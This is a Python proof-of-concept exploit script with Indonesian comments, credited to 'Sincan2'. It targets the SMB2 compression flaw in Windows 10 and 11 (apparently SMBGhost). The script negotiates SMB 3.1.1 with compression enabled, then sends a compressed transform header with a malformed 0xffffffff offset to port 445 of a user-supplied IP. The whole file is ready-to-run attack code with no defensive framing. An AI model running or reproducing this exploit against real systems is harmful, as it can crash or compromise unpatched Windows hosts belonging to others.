import socket, struct, sys

class Smb2Header:
    def __init__(self, command, message_id):
        self.protocol_id = b"\xfeSMB"
        self.structure_size = b"\x40\x00"  # Harus diset ke 0x40
        self.credit_charge = b"\x00"*2
        self.channel_sequence = b"\x00"*2
        self.channel_reserved = b"\x00"*2
        self.command = command
        self.credits_requested = b"\x00"*2  # Jumlah kredit yang diminta / diberikan
        self.flags = b"\x00"*4
        self.chain_offset = b"\x00"*4  # Menunjuk ke pesan berikutnya
        self.message_id = message_id
        self.reserved = b"\x00"*4
        self.tree_id = b"\x00"*4  # Berubah untuk beberapa perintah
        self.session_id = b"\x00"*8
        self.signature = b"\x00"*16

    def get_packet(self):
        return (
            self.protocol_id +
            self.structure_size +
            self.credit_charge +
            self.channel_sequence +
            self.channel_reserved +
            self.command +
            self.credits_requested +
            self.flags +
            self.chain_offset +
            self.message_id +
            self.reserved +
            self.tree_id +
            self.session_id +
            self.signature
        )

class Smb2NegotiateRequest:
    def __init__(self):
        self.header = Smb2Header(b"\x00"*2, b"\x00"*8)
        self.structure_size = b"\x24\x00"
        self.dialect_count = b"\x08\x00"  # 8 dialek
        self.security_mode = b"\x00"*2
        self.reserved = b"\x00"*2
        self.capabilities = b"\x7f\x00\x00\x00"
        self.guid = b"\x01\x02\xab\xcd"*4
        self.negotiate_context = b"\x78\x00"
        self.additional_padding = b"\x00"*2
        self.negotiate_context_count = b"\x02\x00"  # 2 Konteks
        self.reserved_2 = b"\x00"*2
        self.dialects = (
            b"\x02\x02" + b"\x10\x02" + b"\x22\x02" + b"\x24\x02" + b"\x00\x03" +
            b"\x02\x03" + b"\x10\x03" + b"\x11\x03"  # SMB 2.0.2, 2.1, 2.2.2, 2.2.3, 3.0, 3.0.2, 3.1.0, 3.1.1
        )
        self.padding = b"\x00"*4

    def context(self, type, length):
        data_length = struct.pack('<H', length)
        reserved = b"\x00"*4
        return type + data_length + reserved

    def preauth_context(self):
        hash_algorithm_count = b"\x01\x00"  # 1 algoritma hash
        salt_length = b"\x20\x00"
        hash_algorithm = b"\x01\x00"  # SHA512
        salt = b"\x00"*32
        pad = b"\x00"*2
        length = b"\x26\x00"
        context_header = self.context(b"\x01\x00", struct.unpack('<H', length)[0])
        return context_header + hash_algorithm_count + salt_length + hash_algorithm + salt + pad

    def compression_context(self):
        compression_algorithm_count = b"\x03\x00"  # 3 algoritma kompresi
        padding = b"\x00"*2
        flags = b"\x01\x00\x00\x00"
        algorithms = b"\x01\x00" + b"\x02\x00" + b"\x03\x00"  # LZNT1 + LZ77 + LZ77+Huffman
        length = b"\x0e\x00"
        context_header = self.context(b"\x03\x00", struct.unpack('<H', length)[0])
        return context_header + compression_algorithm_count + padding + flags + algorithms

    def get_packet(self):
        padding = b"\x00"*8
        return (
            self.header.get_packet() +
            self.structure_size +
            self.dialect_count +
            self.security_mode +
            self.reserved +
            self.capabilities +
            self.guid +
            self.negotiate_context +
            self.additional_padding +
            self.negotiate_context_count +
            self.reserved_2 +
            self.dialects +
            self.padding +
            self.preauth_context() +
            self.compression_context() +
            padding
        )

class NetBIOSWrapper:
    def __init__(self, data):
        self.session = b"\x00"
        self.length = struct.pack('>H', len(data))
        self.data = data

    def get_packet(self):
        return self.session + self.length + self.data

class Smb2CompressedTransformHeader:
    def __init__(self, data):
        self.data = data
        self.protocol_id = b"\xfcSMB"
        self.original_decompressed_size = struct.pack('<i', len(self.data))
        self.compression_algorithm = b"\x01\x00"
        self.flags = b"\x00"*2
        self.offset = b"\xff\xff\xff\xff"  # Kerentanan Sincan2

    def get_packet(self):
        return (
            self.protocol_id +
            self.original_decompressed_size +
            self.compression_algorithm +
            self.flags +
            self.offset +
            self.data
        )

def send_negotiation(sock):
    negotiate = Smb2NegotiateRequest()
    packet = NetBIOSWrapper(negotiate.get_packet()).get_packet()
    sock.send(packet)
    response = sock.recv(3000)
    print(f"Menerima {len(response)} byte dari server")

def send_compressed(sock, data):
    compressed = Smb2CompressedTransformHeader(data)
    packet = NetBIOSWrapper(compressed.get_packet()).get_packet()
    sock.send(packet)
    response = sock.recv(1000)
    print(f"Menerima {len(response)} byte dari server")

if __name__ == "__main__":
    print("***********************")
    print("*  Sincan2 POC wincok 10-11 *")
    print("*  Oleh Sincan2         *")
    print("***********************")
    if len(sys.argv) != 2:
        exit("[-] Penggunaan: {} target_ip".format(sys.argv[0]))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(3)
    sock.connect((sys.argv[1], 445))
    send_negotiation(sock)
    send_compressed(sock, b"JST" * 100)
    sock.close()
